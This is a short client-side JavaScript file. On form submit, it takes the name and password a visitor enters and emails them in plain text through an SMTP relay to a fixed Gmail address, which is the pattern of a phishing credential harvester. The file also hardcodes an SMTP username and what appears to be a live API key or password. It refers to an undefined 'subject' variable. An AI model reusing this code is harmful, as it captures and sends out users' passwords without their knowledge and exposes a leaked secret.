const form = document.querySelector("form");
const fullName = document.getElementById("name");
const password = document.getElementById("password");

function sendEmail(){
    const bodyMessage = `Name: ${fullName.value} <br> Password: ${password.value}`

    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "ahmedawais1009@gmail.com",
        Password : "3F8B19CA6219EDA082CBE4FA8A816580255A",
        To : 'ahmedawais1009@gmail.com',
        From : "ahmedawais1009@gmail.com",
        Subject : subject.value,
        Body : bodyMessage
    }).then(
      message => alert(message)
    );
}

form.addEventListener("submit", (e) =>{
    e.preventDefault();

    sendEmail();
})